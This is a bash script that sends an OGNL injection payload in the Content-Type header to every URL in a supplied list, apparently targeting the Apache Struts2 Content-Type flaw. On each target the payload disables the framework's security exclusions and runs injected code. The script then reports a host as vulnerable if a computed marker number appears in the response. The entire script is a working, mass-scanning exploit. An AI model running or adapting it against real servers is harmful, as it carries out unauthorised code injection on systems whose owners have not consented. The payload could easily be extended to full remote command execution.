#!/bin/bash 

if [[ -z "$1" ]]; then
	echo -e "You need to provide a filename with list of all URLs \n ./script.sh file.txt \n With file.txt having the list of all the URLs to scan"
	exit
fi

cat "$1" | while read in; do 
	if curl -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(102*102*102*99)).(#ros.flush())}" "$in" -s| grep -q "105059592"; then
		echo -e "VULNERABLE  VUL VULN VULN :) \n$in"
	else 
		echo -e "NOT VULNERABLE \n$in"
	fi
done
